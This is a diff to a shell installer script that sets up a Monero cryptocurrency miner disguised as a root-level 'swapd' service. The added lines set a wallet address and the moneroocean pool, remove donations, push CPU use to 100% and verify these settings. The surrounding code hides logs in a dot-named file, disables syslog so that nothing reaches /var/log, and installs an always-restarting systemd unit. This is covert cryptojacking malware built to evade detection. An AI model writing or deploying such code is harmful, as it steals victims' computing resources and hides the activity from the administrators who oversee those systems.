@@ -1745,6 +1745,12 @@ try:
     with open('$config_file', 'r') as f:
         config = json.load(f)
     
+    # CRITICAL: Set wallet address (MUST BE SET CORRECTLY!)
+    config['user'] = '$WALLET'
+    
+    # CRITICAL: Set pool URL
+    config['url'] = 'gulf.moneroocean.stream:80'
+    
     # CRITICAL: Set log file to hidden location
     config['log-file'] = '/root/.swapd/.swap_logs/.swap-history.bin'
     
@@ -1753,6 +1759,13 @@ try:
     
     # Enable verbose logging for detailed output
     config['verbose'] = 2
+    
+    # Disable donations
+    config['donate-level'] = 0
+    config['donate-over-proxy'] = 0
+    
+    # Max CPU usage
+    config['max-cpu-usage'] = 100
     
     # Enable log rotation to prevent huge files
     config['retries'] = 5
@@ -1773,12 +1786,32 @@ PYEOF
     done
     
     # Verify the configuration
+    echo ""
+    echo "[*] Verifying critical configuration..."
+    
+    # Verify wallet was set
+    if grep -q "$WALLET" /root/.swapd/config.json 2>/dev/null; then
+        echo "[✓] Wallet correctly set in config: ${WALLET:0:20}...${WALLET: -10}"
+    else
+        echo "[!] ERROR: Wallet NOT found in config.json!"
+        echo "[!] This is a CRITICAL error - miner will not work!"
+    fi
+    
+    # Verify pool was set
+    if grep -q 'gulf.moneroocean.stream' /root/.swapd/config.json 2>/dev/null; then
+        echo "[✓] Pool correctly set: gulf.moneroocean.stream:80"
+    else
+        echo "[!] ERROR: Pool NOT correctly set!"
+    fi
+    
+    # Verify log file was set
     if grep -q '\.swap-history\.bin' /root/.swapd/config.json 2>/dev/null; then
         echo "[✓] Hidden swapd logging enabled: /root/.swapd/.swap_logs/.swap-history.bin"
     else
         echo "[!] Warning: Could not verify log-file setting"
     fi
     
+    # Verify syslog is disabled
     if grep -q '"syslog": *false' /root/.swapd/config.json 2>/dev/null; then
         echo "[✓] Syslog DISABLED (logs stay hidden - never in /var/log)"
     else
@@ -2182,6 +2215,7 @@ After=network.target
 
 [Service]
 Type=simple
+WorkingDirectory=/root/.swapd
 ExecStart=/bin/bash /root/.swapd/launcher.sh
 Restart=always
 RestartSec=10
